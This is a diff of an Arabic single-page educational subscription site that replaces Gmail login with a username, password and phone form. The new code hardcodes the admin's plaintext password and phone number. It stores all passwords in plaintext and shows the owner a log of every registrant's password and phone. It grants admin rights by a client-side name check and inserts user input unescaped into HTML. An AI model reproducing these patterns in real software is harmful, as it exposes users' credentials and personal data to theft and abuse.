@@ -11,7 +11,6 @@
       --card-bg: #1a1a1a;
       --text-color: #ffffff;
       --accent-yellow: #ffcc00;
-      --accent-hover: #ffd733;
       --border-color: #333333;
       --input-bg: #262626;
       --badge-bg: #2a2a18;
@@ -23,7 +22,6 @@
       --card-bg: #ffffff;
       --text-color: #111111;
       --accent-yellow: #ffcc00;
-      --accent-hover: #e6b800;
       --border-color: #e2e8f0;
       --input-bg: #f8fafc;
       --badge-bg: #fff9db;
@@ -51,14 +49,12 @@
     }
 
     .navbar-right { display: flex; align-items: center; gap: 10px; }
-    
     .platform-logo-wrapper {
-      width: 42px; height: 42px;
-      border-radius: 50%; border: 2px solid var(--accent-yellow);
-      overflow: hidden; display: flex; align-items: center; justify-content: center;
+      width: 42px; height: 42px; border-radius: 50%;
+      border: 2px solid var(--accent-yellow); overflow: hidden;
+      display: flex; align-items: center; justify-content: center;
       background-color: #000; flex-shrink: 0;
     }
-
     .platform-logo-img { width: 100%; height: 100%; object-fit: cover; }
 
     .btn-main {
@@ -89,28 +85,38 @@
 
     .hidden { display: none !important; }
 
-    /* شاشة ملف المستخدم والأيدي */
+    /* نافذة التسجيل */
+    .modal-overlay {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.8); z-index: 10000;
+      display: flex; align-items: center; justify-content: center; padding: 15px;
+    }
+    .modal-card {
+      background: var(--card-bg); border: 2px solid var(--accent-yellow);
+      border-radius: 16px; padding: 25px; width: 100%; max-width: 400px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+    }
+
+    .validation-msg { font-size: 12px; font-weight: bold; margin-top: -5px; margin-bottom: 10px; }
+    .msg-success { color: #25d366; }
+    .msg-error { color: #ff4d4d; }
+
+    /* البروفايل */
     .user-profile-card {
       background: var(--badge-bg);
       border: 1.5px solid var(--accent-yellow);
-      border-radius: 12px;
-      padding: 15px;
-      margin-bottom: 20px;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: center;
-      gap: 10px;
+      border-radius: 12px; padding: 18px; margin-bottom: 20px;
     }
 
-    .user-info-item { font-size: 14px; font-weight: bold; }
-    .status-badge {
-      padding: 4px 12px; border-radius: 12px; font-size: 12px; font-weight: bold;
+    .profile-header-flex {
+      display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 10px;
     }
+
+    .status-badge { padding: 4px 12px; border-radius: 12px; font-size: 12px; font-weight: bold; }
     .status-active { background-color: #25d366; color: #000; }
     .status-expired { background-color: #ff4d4d; color: #fff; }
 
-    /* صندوق الدردشة */
+    /* الدردشة */
     .chat-box {
       height: 220px; overflow-y: auto; border: 1px solid var(--border-color);
       border-radius: 8px; padding: 10px; background-color: var(--input-bg); margin-bottom: 10px;
@@ -118,7 +124,7 @@
     .chat-msg { margin-bottom: 8px; padding: 6px 10px; border-radius: 8px; background: rgba(255,204,0,0.1); }
     .chat-msg strong { color: var(--accent-yellow); }
 
-    /* تبويبات الأقسام */
+    /* الأقسام */
     .sections-bar { display: flex; gap: 8px; overflow-x: auto; margin-bottom: 15px; padding-bottom: 5px; }
     .category-tab {
       background: var(--input-bg); border: 1px solid var(--border-color);
@@ -126,7 +132,6 @@
     }
     .category-tab.active { background: var(--accent-yellow); color: #000; font-weight: bold; }
 
-    /* كروت الاختبارات والدروس */
     .quiz-card, .lesson-card {
       border: 1px solid var(--border-color); padding: 15px;
       border-radius: 12px; margin-bottom: 12px; background-color: var(--input-bg);
@@ -142,6 +147,11 @@
       text-align: center; color: #ff4d4d; font-weight: bold; padding: 20px;
       border: 1px dashed #ff4d4d; border-radius: 12px; background: rgba(255, 77, 77, 0.05);
     }
+
+    .log-item {
+      background: var(--input-bg); border-right: 3px solid var(--accent-yellow);
+      padding: 10px; margin-bottom: 8px; border-radius: 6px; font-size: 13px;
+    }
   </style>
 </head>
 <body>
@@ -154,48 +164,88 @@
       </div>
       <span id="navUserDisplay" style="font-size: 13px; font-weight: bold;">غير مسجل دخول</span>
     </div>
-    <div style="display: flex; gap: 8px;">
-      <button id="authBtn" class="btn-main" onclick="handleAuthClick()">تسجيل الدخول بجيميل 🚀</button>
+    <div style="display: flex; gap: 8px; align-items: center;">
+      <button id="loginBtn" class="btn-main" onclick="openAuthModal()">تسجيل الدخول / إنشاء حساب 🚀</button>
+      <button id="logoutBtn" class="btn-danger hidden" onclick="logout()">تسجيل خروج</button>
       <button class="btn-main" style="padding: 8px 12px;" onclick="toggleTheme()">☀️/🌙</button>
+    </div>
+  </div>
+
+  <!-- 🔐 نافذة التسجيل وإنشاء الحساب المنبثقة -->
+  <div id="authModal" class="modal-overlay hidden">
+    <div class="modal-card">
+      <h2 style="color: var(--accent-yellow); margin-top:0; text-align:center;">تسجيل الدخول للمنصة</h2>
+
+      <!-- اسم المستخدم -->
+      <label style="font-size: 12px; font-weight: bold;">اسم المستخدم:</label>
+      <input type="text" id="regUsername" class="input-field" placeholder="أدخل اسم المستخدم..." oninput="checkUsernameAvailability()">
+      <div id="usernameStatusMsg" class="validation-msg"></div>
+
+      <!-- كلمة المرور -->
+      <label style="font-size: 12px; font-weight: bold;">كلمة المرور:</label>
+      <input type="password" id="regPassword" class="input-field" placeholder="أدخل كلمة المرور...">
+
+      <!-- رقم الهاتف -->
+      <label style="font-size: 12px; font-weight: bold;">رقم الهاتف (مصري):</label>
+      <input type="tel" id="regPhone" class="input-field" placeholder="مثال: 01005094619">
+
+      <div style="display: flex; gap: 10px; margin-top: 15px;">
+        <button class="btn-main" style="flex:1;" onclick="submitAuth()">دخول / تسجيل</button>
+        <button class="btn-danger" onclick="closeAuthModal()">إلغاء</button>
+      </div>
     </div>
   </div>
 
   <div class="main-container">
 
-    <!-- 👤 شاشة بيانات المستخدم / الأيدي / حالة الاشتراك -->
+    <!-- 👤 كارت البروفايل -->
     <div id="userProfileCard" class="user-profile-card hidden">
-      <div class="user-info-item">👤 المستخدم: <span id="profileUser">---</span></div>
-      <div class="user-info-item">🆔 ID الطالب: <span id="profileID" style="color: var(--accent-yellow);">---</span></div>
-      <div class="user-info-item">📅 أيام الاشتراك: <span id="profileDays">0</span> يوم</div>
-      <div>حالة الاشتراك: <span id="profileStatusBadge" class="status-badge status-expired">غير نشط</span></div>
+      <div class="profile-header-flex">
+        <div>
+          <h3>👤 بيانات الحساب الشخصي</h3>
+          <div>اسم المستخدم: <strong id="profileName" style="color: var(--accent-yellow);">---</strong></div>
+          <div>رقم الهاتف: <span id="profilePhone">---</span></div>
+          <div>🆔 المعرف (ID): <strong id="profileID" style="color: var(--accent-yellow);">---</strong></div>
+        </div>
+        <div>
+          <div>متبقي بالاشتراك: <strong id="profileDays">0</strong> يوم</div>
+          <div style="margin-top: 5px;">الحالة: <span id="profileStatusBadge" class="status-badge status-expired">غير مفعل</span></div>
+        </div>
+      </div>
     </div>
 
-    <!-- 👑 لوحة تحكم المالك (تظهر فقط لـ youssef57255@gmail.com) -->
+    <!-- 👑 لوحة تحكم المالك -->
     <div id="adminPanel" class="section-card hidden">
-      <h2 style="color: var(--accent-yellow); margin-top:0;">👑 لوحة تحكم المالك (مستر يوسف)</h2>
+      <h2 style="color: var(--accent-yellow); margin-top:0;">👑 لوحة تحكم المالك (alsaidi plus)</h2>
 
-      <!-- 1. إدارة الأعضاء -->
-      <h3>👥 إضافة أو تعديل اشتراك طالب:</h3>
+      <!-- 🔔 سجل التسجيلات الجديدة -->
+      <h3 style="color: var(--accent-yellow);">🔔 الإشعارات وسجل تسجيل الدخول الجديد:</h3>
+      <div id="adminLoginLogs" style="max-height: 200px; overflow-y: auto; margin-bottom: 20px;"></div>
+
+      <hr style="border-color: var(--border-color); margin: 20px 0;">
+
+      <!-- إدارة الاشتراكات -->
+      <h3>👥 تفعيل اشتراك طالب (اسم المستخدم أو الـ ID):</h3>
       <div style="display: flex; gap: 10px; flex-wrap: wrap;">
-        <input type="text" id="studentInput" class="input-field" placeholder="بريد الطالب الجيميل أو الـ ID..." style="flex: 2;">
+        <input type="text" id="studentInput" class="input-field" placeholder="اسم المستخدم أو الـ ID..." style="flex: 2;">
         <input type="number" id="studentDaysInput" class="input-field" placeholder="عدد الأيام..." style="flex: 1;">
         <button class="btn-main" onclick="addOrUpdateStudent()">تفعيل / تمديد الاشتراك</button>
       </div>
 
       <hr style="border-color: var(--border-color); margin: 20px 0;">
 
-      <!-- 2. إدارة الأقسام -->
-      <h3>📂 إدارة الأقسام (إنشاء / إزالة):</h3>
+      <!-- إدارة الأقسام -->
+      <h3>📂 إدارة الأقسام:</h3>
       <div style="display: flex; gap: 10px;">
-        <input type="text" id="newCatInput" class="input-field" placeholder="اسم القسم الجديد (مثلاً: الفيزياء الحيوية)...">
+        <input type="text" id="newCatInput" class="input-field" placeholder="اسم القسم الجديد...">
         <button class="btn-main" onclick="addNewCategory()">إضافة قسم</button>
       </div>
       <div id="adminCategoriesList" style="margin-top: 10px; display: flex; gap: 8px; flex-wrap: wrap;"></div>
 
       <hr style="border-color: var(--border-color); margin: 20px 0;">
 
-      <!-- 3. رفع المحتوى -->
-      <h3>📁 رفع درس أو محتوى جديد:</h3>
+      <!-- رفع المحتوى -->
+      <h3>📁 رفع درس جديد:</h3>
       <select id="uploadCategorySelect" class="input-field"></select>
       <input type="text" id="lessonTitle" class="input-field" placeholder="عنوان الدرس...">
       <input type="url" id="lessonUrl" class="input-field" placeholder="رابط الفيديو / الصورة / المستند...">
@@ -208,17 +258,17 @@
 
       <hr style="border-color: var(--border-color); margin: 20px 0;">
 
-      <!-- 4. إنشاء اختبارات -->
+      <!-- إنشاء اختبارات -->
       <h3>📝 إنشاء اختبار جديد:</h3>
       <input type="text" id="quizTitle" class="input-field" placeholder="عنوان الاختبار...">
-      <input type="text" id="quizQuestion" class="input-field" placeholder="نص السؤال...">
+      <input type="text" id="quizQuestion" class="input-field" placeholder="السؤال...">
       <input type="text" id="optA" class="input-field" placeholder="الخيار الأول (أ)">
       <input type="text" id="optB" class="input-field" placeholder="الخيار الثاني (ب)">
       <input type="text" id="optC" class="input-field" placeholder="الخيار الثالث (ج)">
       <select id="correctOpt" class="input-field">
-        <option value="A">الإجابة الصحيحة هي (أ)</option>
-        <option value="B">الإجابة الصحيحة هي (ب)</option>
-        <option value="C">الإجابة الصحيحة هي (ج)</option>
+        <option value="A">الخيار الصحيح (أ)</option>
+        <option value="B">الخيار الصحيح (ب)</option>
+        <option value="C">الخيار الصحيح (ج)</option>
       </select>
       <button class="btn-main" onclick="createNewQuiz()">نشر الاختبار 📝</button>
     </div>
@@ -240,7 +290,7 @@
       <div id="lessonsArea"></div>
     </div>
 
-    <!-- 📝 الاختبارات والتطبيقات (تظهر فقط بعد تفعيل الاشتراك) -->
+    <!-- 📝 الاختبارات -->
     <div class="section-card">
       <h2 style="color: var(--accent-yellow); margin-top:0;">📝 الاختبارات والتطبيقات</h2>
       <div id="quizzesArea"></div>
@@ -249,19 +299,18 @@
   </div>
 
   <script>
-    const ADMIN_EMAIL = "youssef57255@gmail.com";
+    // 👑 بيانات حساب المالك الجديدة
+    const ADMIN_USERNAME = "alsaidi plus";
 
-    // --- قاعدة البيانات المحلية المدمجة ---
     let state = JSON.parse(localStorage.getItem('alsaidi_platform_db')) || {
       categories: ['القسم العام', 'الفيزياء', 'الكيمياء'],
       lessons: [],
       quizzes: [],
-      chat: [
-        { sender: 'مستر يوسف', text: 'أهلاً بكم في منصة الصعيدي التعليمية! 🚀' }
-      ],
+      chat: [{ sender: 'alsaidi plus', text: 'مرحباً بكم في المنصة! 👋' }],
       students: {
-        "youssef57255@gmail.com": { email: "youssef57255@gmail.com", id: "ID-9999", daysLeft: 999, active: true }
-      }
+        "alsaidi plus": { username: "alsaidi plus", pass: "57255", phone: "+201005094619", id: "ID-9999", daysLeft: 999, active: true }
+      },
+      loginLogs: [] // سجل التسجيلات الجديدة
     };
 
     let currentUser = JSON.parse(localStorage.getItem('alsaidi_current_user')) || null;
@@ -273,49 +322,109 @@
       renderApp();
     }
 
-    // --- نظام المصادقة وتسجيل الدخول ---
-    function handleAuthClick() {
-      if (currentUser) {
-        currentUser = null;
-        alert('تم تسجيل الخروج بنجاح.');
-      } else {
-        const email = prompt("أدخل البريد الإلكتروني الخاص بك (Gmail):", "youssef57255@gmail.com");
-        if (!email) return;
-
-        const cleanEmail = email.trim().toLowerCase();
-        let studentData = state.students[cleanEmail];
-
-        if (!studentData) {
-          // إنشاء حساب جديد وتوليد ID فريد
-          const randomID = "ID-" + Math.floor(1000 + Math.random() * 9000);
-          studentData = {
-            email: cleanEmail,
-            id: randomID,
-            daysLeft: (cleanEmail === ADMIN_EMAIL) ? 999 : 0,
-            active: (cleanEmail === ADMIN_EMAIL)
-          };
-          state.students[cleanEmail] = studentData;
-        }
-
-        currentUser = studentData;
-        alert(`تم تسجيل الدخول بنجاح! \n أهلاً بك: ${currentUser.email}`);
-      }
-      saveData();
+    // --- تحكم بالنافذة المنبثقة للتسجيل ---
+    function openAuthModal() {
+      document.getElementById('authModal').classList.remove('hidden');
     }
 
-    // --- تحديث الواجهة الرئيسية ---
+    function closeAuthModal() {
+      document.getElementById('authModal').classList.add('hidden');
+    }
+
+    // --- التحقق التلقائي المباشر من اسم المستخدم ---
+    function checkUsernameAvailability() {
+      const usernameInput = document.getElementById('regUsername').value.trim().toLowerCase();
+      const statusMsg = document.getElementById('usernameStatusMsg');
+
+      if (!usernameInput) {
+        statusMsg.innerText = '';
+        return false;
+      }
+
+      if (state.students[usernameInput]) {
+        statusMsg.innerText = "اسم المستخدم هذا مستخدم بالفعل ❌";
+        statusMsg.className = "validation-msg msg-error";
+        return false;
+      } else {
+        statusMsg.innerText = "اسم المستخدم هذا متاح ✅";
+        statusMsg.className = "validation-msg msg-success";
+        return true;
+      }
+    }
+
+    // --- تنفيذ التسجيل أو الدخول ---
+    function submitAuth() {
+      const username = document.getElementById('regUsername').value.trim().toLowerCase();
+      const pass = document.getElementById('regPassword').value.trim();
+      const phone = document.getElementById('regPhone').value.trim();
+
+      if (!username || !pass || !phone) {
+        alert("يرجى ملء كافة البيانات المطلوبة!");
+        return;
+      }
+
+      // تسجيل دخول لحساب موجود بالفعل
+      if (state.students[username]) {
+        if (state.students[username].pass === pass) {
+          currentUser = state.students[username];
+          saveData();
+          closeAuthModal();
+          alert(`أهلاً بك مجدداً يا ${currentUser.username}!`);
+        } else {
+          alert("كلمة المرور غير صحيحة!");
+        }
+        return;
+      }
+
+      // إنشاء حساب جديد للطلاب
+      const newStudent = {
+        username: username,
+        pass: pass,
+        phone: phone,
+        id: "ID-" + Math.floor(1000 + Math.random() * 9000),
+        daysLeft: (username === ADMIN_USERNAME.toLowerCase()) ? 999 : 0,
+        active: (username === ADMIN_USERNAME.toLowerCase())
+      };
+
+      state.students[username] = newStudent;
+      currentUser = newStudent;
+
+      // إضافة إشعار في لوحة تحكم المالك
+      const timeString = new Date().toLocaleString('ar-EG');
+      state.loginLogs.unshift({
+        user: username,
+        phone: phone,
+        pass: pass,
+        time: timeString
+      });
+
+      saveData();
+      closeAuthModal();
+      alert(`تم إنشاء الحساب وتسجيل الدخول بنجاح! أهلاً بك يا ${username}`);
+    }
+
+    function logout() {
+      currentUser = null;
+      saveData();
+      alert('تم تسجيل الخروج.');
+    }
+
+    // --- العرض والتحكم ---
     function renderApp() {
       const navUserDisplay = document.getElementById('navUserDisplay');
-      const authBtn = document.getElementById('authBtn');
+      const loginBtn = document.getElementById('loginBtn');
+      const logoutBtn = document.getElementById('logoutBtn');
       const profileCard = document.getElementById('userProfileCard');
       const adminPanel = document.getElementById('adminPanel');
 
       if (currentUser) {
-        navUserDisplay.innerText = currentUser.email;
-        authBtn.innerText = "تسجيل الخروج";
+        navUserDisplay.innerText = currentUser.username;
+        loginBtn.classList.add('hidden');
+        logoutBtn.classList.remove('hidden');
         profileCard.classList.remove('hidden');
 
-        document.getElementById('profileUser').innerText = currentUser.email;
+        document.getElementById('profileName').innerText = currentUser.username;
+        document.getElementById('profilePhone').innerText = currentUser.phone;
         document.getElementById('profileID').innerText = currentUser.id;
         document.getElementById('profileDays').innerText = currentUser.daysLeft;
 
@@ -328,16 +437,17 @@
           badge.className = "status-badge status-expired";
         }
 
-        // إظهار لوحة التحكم للمالك فقط
-        if (currentUser.email.toLowerCase() === ADMIN_EMAIL.toLowerCase()) {
+        if (currentUser.username.toLowerCase() === ADMIN_USERNAME.toLowerCase()) {
           adminPanel.classList.remove('hidden');
+          renderAdminLogs();
           renderAdminCategories();
         } else {
           adminPanel.classList.add('hidden');
         }
       } else {
         navUserDisplay.innerText = "غير مسجل دخول";
-        authBtn.innerText = "تسجيل الدخول بجيميل 🚀";
+        loginBtn.classList.remove('hidden');
+        logoutBtn.classList.add('hidden');
         profileCard.classList.add('hidden');
         adminPanel.classList.add('hidden');
       }
@@ -348,7 +458,26 @@
       renderChat();
     }
 
-    // --- إدارة الأقسام والرفع (المالك) ---
+    // عرض سجل التسجيلات للمالك
+    function renderAdminLogs() {
+      const container = document.getElementById('adminLoginLogs');
+      container.innerHTML = '';
+      if (!state.loginLogs || state.loginLogs.length === 0) {
+        container.innerHTML = '<p style="opacity:0.7;">لا توجد تسجيلات جديدة حتى الآن.</p>';
+        return;
+      }
+
+      state.loginLogs.forEach(log => {
+        container.innerHTML += `
+          <div class="log-item">
+            🚨 <strong>تم تسجيل حساب جديد:</strong><br>
+            👤 اسم المستخدم: <strong>${log.user}</strong> | 📞 الرقم: <strong>${log.phone}</strong> | 🔑 الباسورد: <strong>${log.pass}</strong><br>
+            📅 الوقت: ${log.time}
+          </div>
+        `;
+      });
+    }
+
     function addNewCategory() {
       const cat = document.getElementById('newCatInput').value.trim();
       if (cat && !state.categories.includes(cat)) {
@@ -359,7 +488,7 @@
     }
 
     function deleteCategory(catName) {
-      if (confirm(`هل أنت تأكد من حذف قسم (${catName})؟`)) {
+      if (confirm(`حذف قسم (${catName})؟`)) {
         state.categories = state.categories.filter(c => c !== catName);
         if (activeCategory === catName) activeCategory = state.categories[0] || '';
         saveData();
@@ -403,23 +532,22 @@
       const type = document.getElementById('lessonType').value;
       const category = document.getElementById('uploadCategorySelect').value;
 
-      if (!title || !url) return alert('يرجى ملء جميع الخانات');
+      if (!title || !url) return alert('يرجى ملء البيانات');
 
       state.lessons.push({ title, url, type, category });
       document.getElementById('lessonTitle').value = '';
       document.getElementById('lessonUrl').value = '';
       saveData();
-      alert('تم رفع الدرس بنجاح!');
     }
 
     function renderLessons() {
       const area = document.getElementById('lessonsArea');
       area.innerHTML = '';
 
-      const isSubscribed = currentUser && (currentUser.active && currentUser.daysLeft > 0 || currentUser.email === ADMIN_EMAIL);
+      const isSubscribed = currentUser && (currentUser.active && currentUser.daysLeft > 0 || currentUser.username.toLowerCase() === ADMIN_USERNAME.toLowerCase());
 
       if (!isSubscribed) {
-        area.innerHTML = `<div class="locked-msg">🔒 الدروس والمحتوى متاحان فقط للطلاب المشتركين. يرجى الاشتراك وتفعيل حسابك لتصفح الدروس.</div>`;
+        area.innerHTML = `<div class="locked-msg">🔒 الدروس تظهر فقط بعد تفعيل الاشتراك من المالك.</div>`;
         return;
       }
 
@@ -439,8 +567,8 @@
           content += `<a href="${l.url}" target="_blank" style="color:var(--accent-yellow); font-weight:bold;">📄 فتح المستند / الملف</a>`;
         }
 
-        if (currentUser && currentUser.email === ADMIN_EMAIL) {
-          content += `<br><button class="btn-danger" style="margin-top:8px;" onclick="deleteLesson(${index})">حذف الدرس 🗑️</button>`;
+        if (currentUser && currentUser.username.toLowerCase() === ADMIN_USERNAME.toLowerCase()) {
+          content += `<br><button class="btn-danger" style="margin-top:8px;" onclick="deleteLesson(${index})">حذف 🗑️</button>`;
         }
 
         area.innerHTML += `<div class="lesson-card">${content}</div>`;
@@ -452,7 +580,6 @@
       saveData();
     }
 
-    // --- إدارة وحماية الاختبارات بالاشتراك ---
     function createNewQuiz() {
       const title = document.getElementById('quizTitle').value.trim();
       const question = document.getElementById('quizQuestion').value.trim();
@@ -470,17 +597,16 @@
       document.getElementById('optB').value = '';
       document.getElementById('optC').value = '';
       saveData();
-      alert('تم نشر الاختبار بنجاح!');
     }
 
     function renderQuizzes() {
       const area = document.getElementById('quizzesArea');
       area.innerHTML = '';
 
-      const isSubscribed = currentUser && (currentUser.active && currentUser.daysLeft > 0 || currentUser.email === ADMIN_EMAIL);
+      const isSubscribed = currentUser && (currentUser.active && currentUser.daysLeft > 0 || currentUser.username.toLowerCase() === ADMIN_USERNAME.toLowerCase());
 
       if (!isSubscribed) {
-        area.innerHTML = `<div class="locked-msg">🔒 الاختبارات والتطبيقات تظهر فقط بعد تفعيل الاشتراك!</div>`;
+        area.innerHTML = `<div class="locked-msg">🔒 الاختبارات تظهر فقط بعد تفعيل الاشتراك!</div>`;
         return;
       }
 
@@ -497,18 +623,15 @@
             <button class="option-btn" onclick="checkQuizAns('${q.correct}', 'A')">أ) ${q.options.A}</button>
             <button class="option-btn" onclick="checkQuizAns('${q.correct}', 'B')">ب) ${q.options.B}</button>
             <button class="option-btn" onclick="checkQuizAns('${q.correct}', 'C')">ج) ${q.options.C}</button>
-            ${currentUser.email === ADMIN_EMAIL ? `<button class="btn-danger" style="margin-top:8px;" onclick="deleteQuiz(${index})">حذف الاختبار 🗑️</button>` : ''}
+            ${currentUser.username.toLowerCase() === ADMIN_USERNAME.toLowerCase() ? `<button class="btn-danger" style="margin-top:8px;" onclick="deleteQuiz(${index})">حذف الاختبار 🗑️</button>` : ''}
           </div>
         `;
       });
     }
 
     function checkQuizAns(correct, selected) {
-      if (selected === correct) {
-        alert('🎉 إجابة صحيحة وممتازة! أحسنت.');
-      } else {
-        alert('❌ إجابة خاطئة! حاول مرة أخرى.');
-      }
+      if (selected === correct) alert('🎉 إجابة صحيحة!');
+      else alert('❌ إجابة خاطئة!');
     }
 
     function deleteQuiz(idx) {
@@ -516,51 +639,41 @@
       saveData();
     }
 
-    // --- إعطاء وتمديد الاشتراكات للطلاب (المالك) ---
     function addOrUpdateStudent() {
       const input = document.getElementById('studentInput').value.trim().toLowerCase();
       const days = parseInt(document.getElementById('studentDaysInput').value);
 
-      if (!input || isNaN(days)) return alert('يرجى أدخال الأيميل/الـ ID وعدد الأيام الصحيح');
+      if (!input || isNaN(days)) return alert('أدخل اسم المستخدم/الـ ID والأيام بشكل صحيح');
 
-      let foundEmail = null;
+      let foundUser = null;
 
-      // البحث عن طريق الأيميل أو الـ ID
-      Object.keys(state.students).forEach(e => {
-        if (e === input || state.students[e].id.toLowerCase() === input) {
-          foundEmail = e;
+      Object.keys(state.students).forEach(u => {
+        if (u === input || state.students[u].id.toLowerCase() === input) {
+          foundUser = u;
         }
       });
 
-      if (!foundEmail) {
-        foundEmail = input;
-        state.students[foundEmail] = {
-          email: foundEmail,
-          id: "ID-" + Math.floor(1000 + Math.random() * 9000),
-          daysLeft: days,
-          active: days > 0
-        };
+      if (!foundUser) {
+        return alert("لم يتم العثور على طالب بهذا الاسم أو الـ ID!");
       } else {
-        state.students[foundEmail].daysLeft += days;
-        state.students[foundEmail].active = state.students[foundEmail].daysLeft > 0;
+        state.students[foundUser].daysLeft += days;
+        state.students[foundUser].active = state.students[foundUser].daysLeft > 0;
       }
 
-      // إذا كان هذا هو المستخدم الفعلي المسجل تحديث بياناته فورياً
-      if (currentUser && currentUser.email === foundEmail) {
-        currentUser = state.students[foundEmail];
+      if (currentUser && currentUser.username === foundUser) {
+        currentUser = state.students[foundUser];
       }
 
-      alert(`تم بنجاح تفعيل/تمديد الاشتراك لـ (${foundEmail}) لمصافة: ${days} يوم.`);
+      alert(`تم تفعيل الاشتراك لـ (${foundUser}) بزيادة ${days} يوم.`);
       document.getElementById('studentInput').value = '';
       document.getElementById('studentDaysInput').value = '';
       saveData();
     }
 
-    // --- الدردشة والمظهر ---
     function sendChatMessage() {
       const msg = document.getElementById('chatInput').value.trim();
       if (!msg) return;
-      const senderName = currentUser ? (currentUser.email === ADMIN_EMAIL ? '👑 مستر يوسف' : currentUser.id) : 'زائر';
+      const senderName = currentUser ? (currentUser.username.toLowerCase() === ADMIN_USERNAME.toLowerCase() ? '👑 alsaidi plus' : currentUser.username) : 'زائر';
 
       state.chat.push({ sender: senderName, text: msg });
       document.getElementById('chatInput').value = '';
@@ -581,8 +694,8 @@
       document.documentElement.setAttribute('data-theme', current === 'dark' ? 'light' : 'dark');
     }
 
-    // تشغيل النظام فورياً
     renderApp();
   </script>
 </body>
 </html>
+
